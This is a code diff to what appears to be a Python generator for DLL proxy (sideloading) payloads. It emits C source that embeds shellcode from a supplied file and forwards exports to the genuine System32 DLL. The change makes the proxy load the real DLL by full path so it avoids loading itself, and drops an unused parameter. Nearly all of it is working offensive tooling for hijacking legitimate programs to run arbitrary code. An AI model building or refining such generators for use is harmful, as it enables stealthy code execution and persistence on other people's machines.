@@ -145,17 +145,12 @@ BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved)
     if (reason == DLL_PROCESS_ATTACH) {{
         DisableThreadLibraryCalls(h);
 
-        /* 1st try: renamed original in the same directory (standard deployment) */
-        HMODULE orig = LoadLibraryA("{orig_name}.dll");
-        if (!orig) {{
-            /* 2nd try: real DLL from System32 – lets the proxy work even when
-               the renamed original hasn't been placed yet (system DLLs only) */
-            char _sysdir[MAX_PATH];
-            if (GetSystemDirectoryA(_sysdir, MAX_PATH)) {{
-                lstrcatA(_sysdir, "\\\\{dll_basename}.dll");
-                orig = LoadLibraryA(_sysdir);
-            }}
-        }}
+        /* Load the real DLL by full System32 path to avoid recursively
+           loading our own proxy when it sits in a higher-priority directory. */
+        char _orig_path[MAX_PATH];
+        if (!GetSystemDirectoryA(_orig_path, MAX_PATH)) return FALSE;
+        lstrcatA(_orig_path, "\\\\{dll_basename}.dll");
+        HMODULE orig = LoadLibraryA(_orig_path);
         if (!orig) return FALSE;
 
 {getproc_calls}
@@ -226,7 +221,6 @@ def _sanitize(name: str, ordinal: int) -> str:
 
 def generate_proxy_source(
     shellcode_path: str,
-    orig_name: str,
     dll_basename: str,
     arch: str,
     exports: list[ExportEntry],
@@ -276,7 +270,6 @@ def generate_proxy_source(
     )
 
     c_src = _C_TEMPLATE.format(
-        orig_name=orig_name,
         dll_basename=dll_basename,
         arch=arch,
         shellcode_bytes=_format_shellcode(sc_data),
@@ -320,7 +313,6 @@ def generate_def_file(
 def write_build_files(
     build_dir: str,
     proxy_name: str,
-    orig_name: str,
     dll_info: DllInfo,
     shellcode_path: str,
     arch: str,
@@ -335,7 +327,6 @@ def write_build_files(
 
     c_src, asm_src, valid_exports = generate_proxy_source(
         shellcode_path=shellcode_path,
-        orig_name=orig_name,
         dll_basename=dll_info.basename,
         arch=arch,
         exports=dll_info.exports,
